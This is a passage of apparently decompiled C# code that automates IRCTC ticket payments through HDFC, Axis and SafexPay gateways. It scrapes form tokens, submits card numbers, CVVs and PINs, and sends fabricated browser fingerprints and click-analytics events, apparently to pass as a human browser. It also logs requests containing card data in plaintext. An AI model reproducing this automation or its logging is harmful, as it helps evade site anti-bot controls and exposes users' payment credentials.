                                        if (_Request(frmMerchantPost, string_94, "https://secureaxis-acs2ui-b1-indblr-blrtdc.axisbank.com/", webProxy_3, ref cookieContainer_, true, true, 60000, 60000, ref string_97, ref string_96, ref webException_0))
                                        {
                                            //string text9DE = string_97.Substring(string_97.IndexOf("form id=\"redirectForm") + 51);
                                            //string value6DE = text9DE.Substring(0, text9DE.IndexOf("\""));
                                            //text9D = string_97.Substring(string_97.IndexOf("PaReq") + 14);
                                            //string value6D = text9D.Substring(0, text9D.IndexOf("\">"));
                                            ////value6D = value6D.Replace("\\", "");
                                            //text9D = string_97.Substring(string_97.IndexOf("name=\"MD") + 17);
                                            //string value7D = text9D.Substring(0, text9D.IndexOf("\">"));
                                            ////value7D = value7D.Replace("\\", "");
                                            //string_94 = "PaReq=" + HttpUtility.UrlEncode(value6D) + "&MD=" + WebUtility.UrlEncode(MDD);
                                            //if (_Request(value6DE, string_94, "https://secureaxis-acs2ui-b1-indblr-blrtdc.axisbank.com/", webProxy_3, ref cookieContainer_, true, true, 60000, 60000, ref string_97, ref string_96, ref webException_0))
                                            {
                                                //try
                                                //{
                                                //    string contents = value6DE + "\n\n\n\n" + value6DE + "\n\n\n\n" + string_94 + "\n\n\n\n" + string_97;
                                                //    string path3hh = "IRLOG/" + class3_0.SRC_STN + "_" + class3_0.DEST_STN + "PAYZAP2" + DateTime.Now.ToString("hhmmssfff");
                                                //    File.WriteAllText(path3hh, contents);
                                                //}
                                                //catch
                                                //{

                                                //}
                                                //string_97 = DecodeEncodedNonAsciiCharacters(string_97);
                                                //string ENCDATA = string_97.Substring(string_97.IndexOf("hidden\" value") + 15);
                                                //ENCDATA = ENCDATA.Substring(0, ENCDATA.IndexOf("\" name=\"encdata\""));
                                                //class3_0.payzappDATA = ENCDATA;
                                                clsMain.Lock("6th Hit output = " + string_97);
                                                Reffral = string_93;
                                                string_90 = string_97;
                                                return true;
                                            }

                                            //try
                                            //{
                                            //    string contents = value6DE + "\n\n\n\n" + value6DE + "\n\n\n\n" + string_94 + "\n\n\n\n" + string_97;
                                            //    string path3hh = "IRLOG/" + class3_0.SRC_STN + "_" + class3_0.DEST_STN + "PAYZAP2" + DateTime.Now.ToString("hhmmssfff");
                                            //    File.WriteAllText(path3hh, contents);
                                            //}
                                            //catch
                                            //{

                                            //}
                                            //string_97 = DecodeEncodedNonAsciiCharacters(string_97);
                                            //string ENCDATA = string_97.Substring(string_97.IndexOf("hidden\" value") + 15);
                                            //ENCDATA = ENCDATA.Substring(0, ENCDATA.IndexOf("\" name=\"encdata\""));
                                            //class3_0.payzappDATA = ENCDATA;
                                            clsMain.Lock("6th Hit output = " + string_97);
                                            Reffral = string_93;
                                            string_90 = string_97;
                                            return true;
                                        }
                                        clsMain.Lock("First Hit Failed. err = " + string_96);
                                        string_91 = "Failed while making Payment.";
                                        bool flag = false;
                                    }
                                }
                                clsMain.Lock("4th Hit output = " + string_97);
                                string_92 = string_93;
                                Debit_Hdfc(string_97, string_92, cookieContainer_0, array[7], ref string_90, ref string_91);
                                string_94 = class3_0.Method_SerialInp(string_90, ref string_93, false);
                                if (_Request(string_93, string_94, string_91, webProxy_3, ref cookieContainer_, true, true, 60000, 60000, ref string_97, ref string_96, ref webException_0))
                                {
                                    clsMain.Lock("6th Hit output = " + string_97);
                                    Reffral = string_93;
                                    string_90 = string_97;
                                    return true;
                                }
                                string text16 = string_97;
                                string text17 = text16.Substring(text16.IndexOf("Authenticate") + 22);
                                string text18 = text17.Substring(0, text17.IndexOf("\""));
                                string_93 = "https://secure.axisbank.com/acs-web-axis/com.enstage.entransact.servers.AccessControlServerAxis?perform=SEND_OTP_AJAX_REQUEST&msg=Authenticate&bankId=8111&accId=" + text18 + "&pageShown=Authenticate";
                                _Request(string_93, "", string_92, webProxy_3, ref cookieContainer_, true, true, 60000, 60000, ref string_97, ref string_96, ref webException_0);
                                text17 = text16.Substring(text16.IndexOf("randomDigit") + 15);
                                string text19 = text17.Substring(0, text17.IndexOf("\""));
                                text17 = text16.Substring(text16.IndexOf("XID") + 12);
                                string value8 = text17.Substring(0, text17.IndexOf("\""));
                                text17 = text16.Substring(text16.IndexOf("Authenticate") + 22);
                                string text20 = text17.Substring(0, text17.IndexOf("\""));
                                text17 = text16.Substring(text16.IndexOf("txtLogin") + 17);
                                string text21 = text17.Substring(0, text17.IndexOf("\""));
                                text17 = text16.Substring(text16.IndexOf("document.frmPayerAuth.action") + 22);
                                text17 = text17.Substring(text17.IndexOf("document.frmPayerAuth.action") + 22);
                                text17 = text17.Substring(text17.IndexOf("jsessionid"));
                                string text22 = text17.Substring(0, text17.IndexOf("\""));
                                string_94 = "xdeviceId=" + text19 + "&bTz=Asia%2FKolkata&bTzOS=-330&XID=" + WebUtility.UrlEncode(value8) + "&txnAuthType=static&hash=&cacheIdentifier=" + text20 + "&txtLogin=" + text21 + "&txtPassword=" + WebUtility.UrlEncode(array[7]) + "&otpValue=";
                                string_93 = text11 + ";" + text22;
                                string_94 = class3_0.Method_SerialInp(text16, ref string_93, false);
                                updateTStatus_1.BeginInvoke(1, "ICICI_Getway(5/6)", tCntrlName_, null, null);
                                clsMain.Lock("5th Hit Inp = " + string_94);
                                if (_Request(string_93, string_94, string_92, webProxy_3, ref cookieContainer_, true, true, 60000, 60000, ref string_97, ref string_96, ref webException_0))
                                {
                                    clsMain.Lock("5th Hit output = " + string_97);
                                    if (string_97.IndexOf("Authentication failed") > 0)
                                    {
                                        if (updateTStatus_1 != null)
                                        {
                                            updateTStatus_1.BeginInvoke(1, "Invalid Transaction Password", tCntrlName_, null, null);
                                        }
                                        return false;
                                    }
                                    string_92 = string_93;
                                    text16 = string_97;
                                    string_93 = "https://secure.axisbank.com/acs-web-axis/com.enstage.entransact.servers.AccessControlServerAxis?perform=SEND_OTP_AJAX_REQUEST&msg=MerchantPost&bankId=8111&accId=" + text18 + "&pageShown=MerchantPost";
                                    _Request(string_93, "", string_92, webProxy_3, ref cookieContainer_, true, true, 60000, 60000, ref string_97, ref string_96, ref webException_0);
                                    string_94 = class3_0.Method_SerialInp(text16, ref string_93, true);
                                    text9 = text16.Substring(text16.IndexOf("PaRes") + 14);
                                    string value9 = text9.Substring(0, text9.IndexOf("\""));
                                    text9 = text16.Substring(text16.IndexOf("name=\"MD") + 17);
                                    string value10 = text9.Substring(0, text9.IndexOf("\""));
                                    string_94 = "MD=" + WebUtility.UrlEncode(value10) + "&PaRes=" + WebUtility.UrlEncode(value9);
                                    updateTStatus_1.BeginInvoke(1, "ICICI_Getway(6/6)", tCntrlName_, null, null);
                                    clsMain.Lock("6th Hit Inp = " + string_94);
                                    if (_Request(string_93, string_94, string_92, webProxy_3, ref cookieContainer_, true, true, 60000, 60000, ref string_97, ref string_96, ref webException_0))
                                    {
                                        clsMain.Lock("6th Hit output = " + string_97);
                                        Reffral = string_93;
                                        string_90 = string_97;
                                        return true;
                                    }
                                }
                            }
                        }
                    }
                    clsMain.Lock("First Hit Failed. err = " + string_96);
                    string_91 = "Failed while making Payment.";
                    return false;
                }
                return result;
            }
            catch (Exception ex)
            {
                clsMain.method_74("ProcessHDFCDebit", ex.Message);
                return false;
            }
        }

        internal bool HDFC_Getway(string string_86, string string_87, string string_88, string string_89, ref string string_90, ref string string_91, UpdateTStatus updateTStatus_2)
        {
            int num = 0;
            int num2 = 0;
            bool result = false;
            clsMain.Lock("Enter ProcesshdfcDebit.");
            string string_92 = "https://www.irctc.co.in/eticketing/journeySummary.jsf?cid=1";
            try
            {
                bool_51 = true;
                num++;
                string_90 = "";
                string_91 = "";
                string[] array = string_87.Split(new string[1] { "||" }, StringSplitOptions.None);
                string text = array[0].Trim();
                string text2 = array[1];
                string text3 = array[2];
                string text4 = array[4];
                string value = array[6];
                string string_93 = "";
                string string_94 = class3_0.Method_SerialInp(string_86, ref string_93, false);
                if (string_86.Contains("encdata") && clsMain.isAPP)
                {
                    string string_95 = GetString_(string_86, "encdata\",\"value", "\"");
                    string_95 = HttpUtility.UrlEncode(string_95);
                    string_93 = GetString_(string_86, "bankUrl\",\"value", "\"");
                    string_94 = string.Concat(new string[2] { "encdata=", string_95 });
                }
                CookieContainer cookieContainer_ = null;
                string string_96 = "";
                string string_97 = "";
                if (text3.Length == 2 && text3[0] == '0')
                {
                    text3 = text3.Substring(1, 1);
                }
                if (updateTStatus_1 != null)
                {
                    updateTStatus_1.BeginInvoke(1, "PAYZAP_Getway Int { 7/1 }", tCntrlName_, null, null);
                }
                if (_Request(string_93, string_94, string_92, webProxy_3, ref cookieContainer_, true, true, 60000, 60000, ref string_97, ref string_96, ref webException_0))
                {
                    clsMain.Lock("First Hit output = " + string_97);
                    num2++;
                    string_92 = string_93;
                    if (clsMain.isAPP)
                    {
                        string_94 = class3_0.Method_SerialInp(string_97, ref string_93, false);
                        string_94 = clsPostData.SetPost(string_94, "paymentMethod", "VISA");
                        int startIndex = string_97.IndexOf("<form");
                        startIndex = string_97.IndexOf("action", startIndex);
                        startIndex = string_97.IndexOf("\"", startIndex) + 1;
                        int length = string_97.IndexOf("\"", startIndex) - startIndex;
                        string_93 = "https://www4.ipg-online.com" + string_97.Substring(startIndex, length);
                        string text5 = string_97.Substring(string_97.IndexOf("_submitOnEnter(event") + 22);
                        string text6 = text5.Substring(0, text5.IndexOf("')"));
                        text5 = string_97.Substring(string_97.IndexOf("j_id1:javax.faces.ViewState:1") + 38);
                        string value2 = text5.Substring(0, text5.IndexOf("\""));
                        value2 = WebUtility.UrlEncode(value2);
                        value2 = value2.Replace("!", "%21");
                        string_94 = "paymentMethod=VISA&org.apache.myfaces.trinidad.faces.FORM=" + text6 + "&_noJavaScript=false&javax.faces.ViewState=" + value2 + "&source=next";
                    }
                    else
                    {
                        int startIndex2 = string_97.IndexOf("<form");
                        startIndex2 = string_97.IndexOf("action", startIndex2);
                        startIndex2 = string_97.IndexOf("\"", startIndex2) + 1;
                        int length2 = string_97.IndexOf("\"", startIndex2) - startIndex2;
                        string_93 = "https://www4.ipg-online.com" + string_97.Substring(startIndex2, length2);
                        string text7 = string_97.Substring(string_97.IndexOf("firstTableCol\"><form") + 25);
                        string text8 = text7.Substring(0, text7.IndexOf("\""));
                        text7 = string_97.Substring(string_97.IndexOf("j_id1:javax.faces.ViewState:1") + 38);
                        string value3 = text7.Substring(0, text7.IndexOf("\""));
                        value3 = WebUtility.UrlEncode(value3);
                        value3 = value3.Replace("!", "%21");
                        string_94 = "paymentMethod=0&org.apache.myfaces.trinidad.faces.FORM=" + text8 + "&_noJavaScript=false&javax.faces.ViewState=" + value3 + "&source=next";
                    }
                    string_93 = string_93.Replace("amp;", "");
                    string_94 = string_94.Replace("!", "%21");
                    if (updateTStatus_1 != null)
                    {
                        updateTStatus_1.BeginInvoke(1, "PAYZAP_Getway Int { 7/2 }", tCntrlName_, null, null);
                    }
                    clsMain.Lock("2nd Hit Inp = " + string_94);
                    if (_Request(string_93, string_94, string_92, webProxy_3, ref cookieContainer_, true, true, 60000, 60000, ref string_97, ref string_96, ref webException_0))
                    {
                        clsMain.Lock("2nd Hit output = " + string_97);
                        string_92 = string_93;
                        string text9 = string_97.Substring(string_97.IndexOf("j_id1:javax.faces.ViewState:1") + 38);
                        string value4 = text9.Substring(0, text9.IndexOf("\""));
                        value4 = WebUtility.UrlEncode(value4);
                        value4 = value4.Replace("!", "%21");
                        List<string> list = new List<string>();
                        int num3 = 4;
                        for (int i = 0; i < text.Length; i += num3)
                        {
                            if (text.Length - i >= num3)
                            {
                                list.Add(text.Substring(i, num3));
                            }
                            else
                            {
                                list.Add(text.Substring(i, text.Length - i));
                            }
                        }
                        string text10 = list[0] + "+" + list[1] + "+" + list[2] + "+" + list[3];
                        string_93 = string_93.Replace("e1s1", "e1s2");
                        string_92 = string_92.Replace(" ", "%20");
                        if (clsMain.isAPP)
                        {
                            string_94 = "bname=" + WebUtility.UrlEncode(value) + "&cardnumber=" + text10 + "&expmonth=" + text2 + "&expyear=" + text3 + "&cvm_masked=***&cvm=" + text4 + "&org.apache.myfaces.trinidad.faces.FORM=cciForm&_noJavaScript=false&javax.faces.ViewState=" + value4 + "&source=next";
                        }
                        else
                        {
                            string expyearr = text3;
                            int expy = int.Parse(expyearr);
                            expy = expy - 2023;
                            string expmonthr = text2;
                            expmonthr = expmonthr.Substring(1);
                            int expm = int.Parse(expmonthr);
                            expm = expm - 1;
                            //if (text2.Contains("0"))
                            //{
                            //    text2 = text2.Substring(text2.Length - 1);
                            //}
                            text10 = text10.Replace("+", " ");
                            //int num4 = int.Parse(text2);
                            //num4--;
                            //text3 = text3.Substring(text3.Length - 1);
                            //int num5 = int.Parse(text3);
                            //num5--;
                            //num5--;
                            string_94 = "bname=" + WebUtility.UrlEncode(value) + "&cardnumber=" + text10 + "&expmonth=" + expm + "&expyear=" + expy + "&cvm_masked=***&cvm=" + text4 + "&org.apache.myfaces.trinidad.faces.FORM=cciForm&_noJavaScript=false&javax.faces.ViewState=" + value4 + "&source=next";
                        }
                        updateTStatus_1.BeginInvoke(1, "PAYZAP_Getway Int { 7/3 }", tCntrlName_, null, null);
                        clsMain.Lock("3rd Hit Inp = " + string_94);
                        if (_Request(string_93, string_94, string_92, webProxy_3, ref cookieContainer_, true, true, 60000, 60000, ref string_97, ref string_96, ref webException_0))
                        {
                            clsMain.Lock("3rd Hit output = " + string_97);
                            text9 = string_97.Substring(string_97.IndexOf("j_id1:javax.faces.ViewState:1") + 38);
                            value4 = text9.Substring(0, text9.IndexOf("\""));
                            value4 = WebUtility.UrlEncode(value4);
                            value4 = value4.Replace("!", "%21");
                            string_94 = string.Concat(new string[3] { "colorDepth=24&screenWidth=1920&screenHeight=1080&timezoneOffsetInMinutes=-330&javaEnabled=false&org.apache.myfaces.trinidad.faces.FORM=info&_noJavaScript=false&javax.faces.ViewState=", value4, "&source=submitButton" });
                            string_92 = string_93;
                            string_93 = string_93.Replace("e1s2", "e1s3");
                            string text11 = "https://secure.axisbank.com/acs-web-axis/EnrollWeb/AxisBank/server/AccessControlServer";
                            updateTStatus_1.BeginInvoke(1, "PAYZAP_Getway Int { 7/4 }", tCntrlName_, null, null);
                            clsMain.Lock("4th Hit Inp = " + string_94);
                            if (_Request(string_93, string_94, string_92, webProxy_3, ref cookieContainer_, true, true, 60000, 60000, ref string_97, ref string_96, ref webException_0))
                            {
                                string_92 = string_93;
                                if (string_97.Contains("TermUrl") && string_88 == "PAYZAP_DC")
                                {
                                    updateTStatus_1.BeginInvoke(1, "PAYZAP_Getway Int { 7/5 }", tCntrlName_, null, null);
                                    string_94 = class3_0.Method_SerialInp(string_97, ref string_93, false);
                                    text9 = string_97.Substring(string_97.IndexOf("PaReq") + 14);
                                    string text12 = text9.Substring(0, text9.IndexOf("\""));
                                    text9 = string_97.Substring(string_97.IndexOf("name=\"MD") + 17);
                                    string text13 = text9.Substring(0, text9.IndexOf("\""));
                                    text9 = string_97.Substring(string_97.IndexOf("name=\"TermUrl") + 22);
                                    string text14 = text9.Substring(0, text9.IndexOf("\""));
                                    text14 = text14.Replace("amp;", "");
                                    if (text13.Contains("_______"))
                                    {
                                        text12 = WebUtility.UrlEncode(text12);
                                        text12 = text12.Replace("%0A", "%0D%0A");
                                        string_94 = "PaReq=" + text12 + "&TermUrl=" + WebUtility.UrlEncode(text14) + "&MD=" + WebUtility.UrlEncode(text13);
                                    }
                                    else
                                    {
                                        string_94 = "MD=" + text13 + "&PaReq=" + HttpUtility.UrlEncode(text12) + "&TermUrl=" + WebUtility.UrlEncode(text14);
                                    }
                                    bool_51 = true;
                                    if (_Request(string_93, string_94, string_92, webProxy_3, ref cookieContainer_, true, true, 60000, 60000, ref string_97, ref string_96, ref webException_0) && string_97.IndexOf("PayZapp secure PIN") > 0)
                                    {
                                        string_92 = string_93;
                                        string_94 = class3_0.Method_SerialInp(string_97, ref string_93, false);
                                        string_94 = clsPostData.SetPost(string_94, "txtPassword", array[3]);
                                        string text15 = string_97.Substring(string_97.IndexOf("XID") + 12);
                                        string value5 = text15.Substring(0, text15.IndexOf("\""));
                                        string_94 = "XID=" + WebUtility.UrlEncode(value5) + "&txtLogin=-1&txtPassword=" + array[3] + "&xdeviceId=&bTz=";
                                        string_93 = "https://hdfc-acs.wibmo.com" + string_93;
                                        updateTStatus_1.BeginInvoke(1, "PAYZAP_Getway Int { 7/6 }", tCntrlName_, null, null);
                                        bool_51 = true;
                                        if (_Request(string_93, string_94, string_92, webProxy_3, ref cookieContainer_, true, true, 60000, 60000, ref string_97, ref string_96, ref webException_0))
                                        {
                                            clsMain.Lock("5th Hit output = " + string_97);
                                            if (string_97.IndexOf("Authentication failed") > 0)
                                            {
                                                if (updateTStatus_1 != null)
                                                {
                                                    updateTStatus_1.BeginInvoke(1, "Invalid PIN", tCntrlName_, null, null);
                                                }
                                                return false;
                                            }
                                            string_92 = string_93;
                                            string_94 = class3_0.Method_SerialInp(string_97, ref string_93, true);
                                            text9 = string_97.Substring(string_97.IndexOf("PaRes") + 14);
                                            string value6 = text9.Substring(0, text9.IndexOf("\""));
                                            text9 = string_97.Substring(string_97.IndexOf("name=\"MD") + 17);
                                            string value7 = text9.Substring(0, text9.IndexOf("\""));
                                            string_94 = "MD=" + WebUtility.UrlEncode(value7) + "&PaRes=" + WebUtility.UrlEncode(value6);
                                            updateTStatus_1.BeginInvoke(1, "PAYZAP_Getway Int { 7/7 }", tCntrlName_, null, null);
                                            clsMain.Lock("6th Hit Inp = " + string_94);
                                            if (_Request(string_93, string_94, string_92, webProxy_3, ref cookieContainer_, true, true, 60000, 60000, ref string_97, ref string_96, ref webException_0))
                                            {
                                                clsMain.Lock("6th Hit output = " + string_97);
                                                Reffral = string_93;
                                                string_90 = string_97;
                                                return true;
                                            }
                                            clsMain.Lock("First Hit Failed. err = " + string_96);
                                            string_91 = "Failed while making Payment.";
                                            bool flag = false;
                                        }
                                    }
                                    else if (string_97.Contains("Notification sent to PayZapp"))
                                    {

                                        updateTStatus_1.BeginInvoke(1, "Slide from PAYZAP app..", tCntrlName_, null, null);
                                        string authenticateid = string_97.Substring(string_97.IndexOf("auth-context-id") + 24);
                                        authenticateid = authenticateid.Substring(0, authenticateid.IndexOf("\" />"));
                                        Thread.Sleep(2000);
                                    ILpayzapp:
                                        Thread.Sleep(500);
                                        string_93 = "https://api.tachyon.hdfcbank.com/cipher3ds/edith/v1.0/tenants/1/authenticate/getStatus?authContextId=" + authenticateid;
                                        _Request(string_93, null, "https://api.tachyon.hdfcbank.com/cipher3ds/visacipher/visacipher/pareq", webProxy_3, ref cookieContainer_, true, true, 60000, 60000, ref string_97, ref string_96, ref webException_0);
                                        //try
                                        //{
                                        //    string contents = string_93 + "\n\n\n\n" + string_93 + "\n\n\n\n" + postdata + "\n\n\n\n" + string_97;
                                        //    string path3hh = "IRLOG/" + class3_0.SRC_STN + "_" + class3_0.DEST_STN + "PAYZAP1" + DateTime.Now.ToString("hhmmssfff");
                                        //    File.WriteAllText(path3hh, contents);
                                        //}
                                        //catch
                                        //{

                                        //}
                                        if (string_97.Contains("PENDING"))
                                        {
                                            goto ILpayzapp;
                                        }
                                        string_97 = DecodeEncodedNonAsciiCharacters(string_97);

                                        string text9DE = string_97.Substring(string_97.IndexOf("redirect-form") + 25);
                                        string value6DE = text9DE.Substring(0, text9DE.IndexOf("\""));
                                        value6DE = value6DE.Replace("\\", "");
                                        //value6DE = value6DE.Replace("u0026", "&");
                                        //value6DE = value6DE.Replace("\\", "");
                                        string text9D = string_97.Substring(string_97.IndexOf("PaRes") + 32);
                                        string value6D = text9D.Substring(0, text9D.IndexOf("\""));
                                        value6D = value6D.Replace("\\", "");
                                        text9D = string_97.Substring(string_97.IndexOf("\"MD") + 30);
                                        string value7D = text9D.Substring(0, text9D.IndexOf("\""));
                                        value7D = value7D.Replace("\\", "");
                                        string_94 = "PaRes=" + HttpUtility.UrlEncode(value6D) + "&MD=" + WebUtility.UrlEncode(value7D);
                                        if (_Request(value6DE, string_94, "https://api.tachyon.hdfcbank.com/", webProxy_3, ref cookieContainer_, true, true, 60000, 60000, ref string_97, ref string_96, ref webException_0))
                                        {
                                            //try
                                            //{
                                            //    string contents = value6DE + "\n\n\n\n" + value6DE + "\n\n\n\n" + string_94 + "\n\n\n\n" + string_97;
                                            //    string path3hh = "IRLOG/" + class3_0.SRC_STN + "_" + class3_0.DEST_STN + "PAYZAP2" + DateTime.Now.ToString("hhmmssfff");
                                            //    File.WriteAllText(path3hh, contents);
                                            //}
                                            //catch
                                            //{

                                            //}
                                            //string_97 = DecodeEncodedNonAsciiCharacters(string_97);
                                            //string ENCDATA = string_97.Substring(string_97.IndexOf("hidden\" value") + 15);
                                            //ENCDATA = ENCDATA.Substring(0, ENCDATA.IndexOf("\" name=\"encdata\""));
                                            //class3_0.payzappDATA = ENCDATA;
                                            clsMain.Lock("6th Hit output = " + string_97);
                                            Reffral = string_93;
                                            string_90 = string_97;
                                            return true;
                                        }
                                        clsMain.Lock("First Hit Failed. err = " + string_96);
                                        string_91 = "Failed while making Payment.";
                                        bool flag = false;
                                    }
                                }
                                clsMain.Lock("4th Hit output = " + string_97);
                                string_92 = string_93;
                                Debit_Hdfc(string_97, string_92, cookieContainer_0, array[7], ref string_90, ref string_91);
                                string_94 = class3_0.Method_SerialInp(string_90, ref string_93, false);
                                if (_Request(string_93, string_94, string_91, webProxy_3, ref cookieContainer_, true, true, 60000, 60000, ref string_97, ref string_96, ref webException_0))
                                {
                                    clsMain.Lock("6th Hit output = " + string_97);
                                    Reffral = string_93;
                                    string_90 = string_97;
                                    return true;
                                }
                                string text16 = string_97;
                                string text17 = text16.Substring(text16.IndexOf("Authenticate") + 22);
                                string text18 = text17.Substring(0, text17.IndexOf("\""));
                                string_93 = "https://secure.axisbank.com/acs-web-axis/com.enstage.entransact.servers.AccessControlServerAxis?perform=SEND_OTP_AJAX_REQUEST&msg=Authenticate&bankId=8111&accId=" + text18 + "&pageShown=Authenticate";
                                _Request(string_93, "", string_92, webProxy_3, ref cookieContainer_, true, true, 60000, 60000, ref string_97, ref string_96, ref webException_0);
                                text17 = text16.Substring(text16.IndexOf("randomDigit") + 15);
                                string text19 = text17.Substring(0, text17.IndexOf("\""));
                                text17 = text16.Substring(text16.IndexOf("XID") + 12);
                                string value8 = text17.Substring(0, text17.IndexOf("\""));
                                text17 = text16.Substring(text16.IndexOf("Authenticate") + 22);
                                string text20 = text17.Substring(0, text17.IndexOf("\""));
                                text17 = text16.Substring(text16.IndexOf("txtLogin") + 17);
                                string text21 = text17.Substring(0, text17.IndexOf("\""));
                                text17 = text16.Substring(text16.IndexOf("document.frmPayerAuth.action") + 22);
                                text17 = text17.Substring(text17.IndexOf("document.frmPayerAuth.action") + 22);
                                text17 = text17.Substring(text17.IndexOf("jsessionid"));
                                string text22 = text17.Substring(0, text17.IndexOf("\""));
                                string_94 = "xdeviceId=" + text19 + "&bTz=Asia%2FKolkata&bTzOS=-330&XID=" + WebUtility.UrlEncode(value8) + "&txnAuthType=static&hash=&cacheIdentifier=" + text20 + "&txtLogin=" + text21 + "&txtPassword=" + WebUtility.UrlEncode(array[7]) + "&otpValue=";
                                string_93 = text11 + ";" + text22;
                                string_94 = class3_0.Method_SerialInp(text16, ref string_93, false);
                                updateTStatus_1.BeginInvoke(1, "ICICI_Getway(5/6)", tCntrlName_, null, null);
                                clsMain.Lock("5th Hit Inp = " + string_94);
                                if (_Request(string_93, string_94, string_92, webProxy_3, ref cookieContainer_, true, true, 60000, 60000, ref string_97, ref string_96, ref webException_0))
                                {
                                    clsMain.Lock("5th Hit output = " + string_97);
                                    if (string_97.IndexOf("Authentication failed") > 0)
                                    {
                                        if (updateTStatus_1 != null)
                                        {
                                            updateTStatus_1.BeginInvoke(1, "Invalid Transaction Password", tCntrlName_, null, null);
                                        }
                                        return false;
                                    }
                                    string_92 = string_93;
                                    text16 = string_97;
                                    string_93 = "https://secure.axisbank.com/acs-web-axis/com.enstage.entransact.servers.AccessControlServerAxis?perform=SEND_OTP_AJAX_REQUEST&msg=MerchantPost&bankId=8111&accId=" + text18 + "&pageShown=MerchantPost";
                                    _Request(string_93, "", string_92, webProxy_3, ref cookieContainer_, true, true, 60000, 60000, ref string_97, ref string_96, ref webException_0);
                                    string_94 = class3_0.Method_SerialInp(text16, ref string_93, true);
                                    text9 = text16.Substring(text16.IndexOf("PaRes") + 14);
                                    string value9 = text9.Substring(0, text9.IndexOf("\""));
                                    text9 = text16.Substring(text16.IndexOf("name=\"MD") + 17);
                                    string value10 = text9.Substring(0, text9.IndexOf("\""));
                                    string_94 = "MD=" + WebUtility.UrlEncode(value10) + "&PaRes=" + WebUtility.UrlEncode(value9);
                                    updateTStatus_1.BeginInvoke(1, "ICICI_Getway(6/6)", tCntrlName_, null, null);
                                    clsMain.Lock("6th Hit Inp = " + string_94);
                                    if (_Request(string_93, string_94, string_92, webProxy_3, ref cookieContainer_, true, true, 60000, 60000, ref string_97, ref string_96, ref webException_0))
                                    {
                                        clsMain.Lock("6th Hit output = " + string_97);
                                        Reffral = string_93;
                                        string_90 = string_97;
                                        return true;
                                    }
                                }
                            }
                        }
                    }
                    clsMain.Lock("First Hit Failed. err = " + string_96);
                    string_91 = "Failed while making Payment.";
                    return false;
                }
                return result;
            }
            catch (Exception ex)
            {
                clsMain.method_74("ProcessHDFCDebit", ex.Message);
                return false;
            }
        }

        internal bool safexpay(string string_86, string string_87, string string_88, string string_89, ref string string_90, ref string string_91, UpdateTStatus updateTStatus_2)
        {
            bool result = false;
            string[] array = string_87.Split(new string[1] { "||" }, StringSplitOptions.None);
            string text = array[0].Trim();
            string string_92 = "";
            string text2 = "";
            string string_93 = "";
            string string_94 = "";
            string string_95 = "";
            CookieContainer cookieContainer_ = new CookieContainer();
            text2 = class3_0.Method_SerialInp(string_86, ref string_92, bool_14: true);
            if (clsMain.isAPP)
            {
                string text3 = string_86.Substring(string_86.IndexOf("encdata") + 18);
                text2 = "encdata=" + text3.Substring(0, text3.IndexOf("\""));
                string_92 = "https://www.irctcipay.com/pgui/jsp/irctcRequestAction";
            }
            if (!_Request(string_92, text2, "https://www.irctc.co.in/", webProxy_3, ref cookieContainer_, bool_63: false, bool_64: true, 60000, 60000, ref string_94, ref string_95, ref webException_0))
            {
                clsMain.Lock("First Hit Failed. err = " + string_95);
                string_91 = "Paytm Gateway not working - Payment Failed";
                return false;
            }
            string_92 = "https://www.avantgardepayments.com/analytics/api/checkout";
            string_93 = "https://www.avantgardepayments.com/agcore/";
            string text4 = string_94.Substring(string_94.IndexOf("b=bindEvents") + 14);
            string text5 = text4.Substring(0, text4.IndexOf("');"));
            string DateTimeeee = System.DateTime.Now.ToString("yyyy-MM-dd'T'hh:mm:ss'Z'");
            string text7 = RandomString(20, "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789");
            text2 = "{\"refId\":\"" + text7 + "\",\"clientId\":\"" + text5 + "\",\"target\":\"UP\",\"event\":\"LI\",\"value\":\"UPI\",\"dateTime\":\"" + DateTimeeee + "\",\"url\":\"https://www.avantgardepayments.com/agcore/#forward\",\"eventType\":\"click\",\"sequenceNo\":2}";
            if (!_Request_safex(string_92, text2, string_93, webProxy_3, ref cookieContainer_, bool_63: false, bool_64: true, 60000, 60000, ref string_94, ref string_95, ref webException_0))
            {
                clsMain.Lock("First Hit Failed. err = " + string_95);
                string_91 = "Paytm Gateway not working - Payment Failed";
                return false;
            }
            clsMain.Lock("First Output htm = " + string_94);
            string_92 = "https://www.avantgardepayments.com/analytics/api/checkout";
            text2 = "{\"refId\":\"" + text7 + "\",\"clientId\":\"" + text5 + "\",\"target\":\"upiPayeeAddress\",\"event\":\"text\",\"value\":\"" + text + "\",\"dateTime\":\"" + DateTimeeee + "\",\"url\":\"https://www.avantgardepayments.com/agcore/#forward\",\"eventType\":\"change\",\"sequenceNo\":6}";
            if (!_Request_safex(string_92, text2, string_93, webProxy_3, ref cookieContainer_, bool_63: false, bool_64: true, 60000, 60000, ref string_94, ref string_95, ref webException_0))
            {
                clsMain.Lock("First Hit Failed. err = " + string_95);
                string_91 = "Paytm Gateway not working - Payment Failed";
                return false;
            }
            clsMain.Lock("First Output htm = " + string_94);
            string_92 = "https://www.avantgardepayments.com/agcore/validateSbiVPA";
            text2 = "{\"agRef\":\"" + text5 + "\",\"vpa\":\"" + text + "\"}";//"{\"refId\":\"" + text7 + "\",\"clientId\":\"" + text5 + "\",\"target\":\"upiPayeeAddress\",\"event\":\"text\",\"value\":\"" + string_87 + "\",\"dateTime\":\"" + DateTimeeee + "\",\"url\":\"https://www.avantgardepayments.com/agcore/#forward\",\"eventType\":\"change\",\"sequenceNo\":6}";
            if (!_Request_safex(string_92, text2, string_93, webProxy_3, ref cookieContainer_, bool_63: false, bool_64: true, 60000, 60000, ref string_94, ref string_95, ref webException_0))
            {
                clsMain.Lock("First Hit Failed. err = " + string_95);
                string_91 = "Paytm Gateway not working - Payment Failed";
                return false;
            }
            clsMain.Lock("First Output htm = " + string_94);
            string_92 = "https://www.avantgardepayments.com/analytics/api/checkout";
            text2 = "{\"refId\":\"" + text7 + "\",\"clientId\":\"" + text5 + "\",\"target\":\"\",\"event\":\"beforeunload\",\"value\":\"closed\",\"dateTime\":\"" + DateTimeeee + "\",\"url\":\"https://www.avantgardepayments.com/agcore/#forward\",\"eventType\":\"beforeunload\",\"sequenceNo\":10}";
                //"{\"refId\":\"" + text7 + "\",\"clientId\":\"" + text5 + "\",\"target\":\"upiPayeeAddress\",\"event\":\"text\",\"value\":\"" + string_87 + "\",\"dateTime\":\"" + DateTimeeee + "\",\"url\":\"https://www.avantgardepayments.com/agcore/#forward\",\"eventType\":\"change\",\"sequenceNo\":6}";
